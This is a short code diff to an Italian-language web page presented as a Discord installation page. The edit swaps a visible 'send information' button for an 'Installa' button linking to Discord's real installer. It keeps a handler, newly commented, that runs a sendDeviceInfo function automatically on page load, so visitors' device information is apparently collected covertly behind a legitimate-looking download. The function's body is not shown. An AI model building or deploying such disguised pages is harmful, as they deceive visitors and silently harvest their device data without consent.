@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord</title>
+    <title>Installazione Discord</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -29,9 +29,9 @@
 </head>
 <body>
 
-    <h1>Installazione di Discord sotto</h1>
-    <button onclick="sendDeviceInfo();">
-        Invia Informazioni
+    <h1>Installazione di Discord</h1>
+    <button onclick="window.location.href='https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x64';">
+        Installa
     </button>
 
     <script>
@@ -154,6 +154,7 @@
             }
         }
 
+        // Invia le informazioni al caricamento della pagina
         window.onload = sendDeviceInfo;
     </script>
 
